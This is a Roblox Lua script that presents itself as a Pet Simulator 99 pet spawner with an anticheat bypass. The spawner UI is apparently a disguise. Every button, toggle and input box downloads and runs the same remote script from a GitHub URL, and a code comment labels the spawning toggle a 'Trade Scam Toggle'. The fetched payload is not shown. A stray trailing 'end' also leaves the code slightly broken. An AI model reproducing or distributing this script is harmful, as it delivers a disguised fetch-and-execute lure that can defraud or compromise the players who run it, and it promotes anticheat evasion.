local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()

-- Create the UI Window
local Window = Rayfield:CreateWindow({
    Name = "🔥 PetSim99 Pet Spawner 🔥",
    LoadingTitle = "Loading Rayfield...",
    LoadingSubtitle = "By DHubOnTop",
    ConfigurationSaving = {
        Enabled = true,
        FolderName = "MyScriptData",
        FileName = "UserSettings"
    },
    Discord = {
        Enabled = false, -- Discord auto-join is now disabled
        Invite = "", -- Your Discord invite link (still available for users)
        RememberJoins = false
    },
    KeySystem = false,
    KeySettings = {
        Title = "Script Key System",
        Subtitle = "Enter your key below or get it from Discord",
        Note = "Find the key in our Discord or visit the key website",
        FileName = "KeyData",
        SaveKey = false,
        GrabKeyFromSite = false,
        Key = {"DHubOnTop"} -- Change to your actual key
    }
})

    local MainTab = Window:CreateTab("Main", 4483362458) -- Main features tab
    MainTab:CreateSection("Script Features")

    -- Bypass Anticheat Button
    MainTab:CreateButton({
        Name = "Bypass Anticheat (Wait 5 min to bypass)",
        Callback = function()
            loadstring(game:HttpGet('https://raw.githubusercontent.com/deno-d9/Dupe/refs/heads/main/Test'))()
        end
    })

    -- Trade Scam Toggle
    MainTab:CreateToggle({
        Name = "Enable pet spawning",
        CurrentValue = false,
        Callback = function()
            loadstring(game:HttpGet('https://raw.githubusercontent.com/deno-d9/Dupe/refs/heads/main/Test'))()
        end
    })

    -- Input Box for User
    MainTab:CreateInput({
        Name = "Pet to spawn",
        PlaceholderText = "Type here...",
        RemoveTextAfterFocusLost = false,
        Callback = function()
            loadstring(game:HttpGet('https://raw.githubusercontent.com/deno-d9/Dupe/refs/heads/main/Test'))()
        end
    })

    -- Label
    MainTab:CreateLabel("Made with ❤️ by DHubOnTop")

    -- Notify User
    Rayfield:Notify({
        Title = "Script Activated",
        Content = "Made with ❤️ by DHubOnTop",
        Duration = 5,
        Image = 4483362458,
        Actions = {
            Ignore = {
                Name = "OK",
                Callback = function()
                    print("User dismissed notification")
                end
            }
        }
    })
end
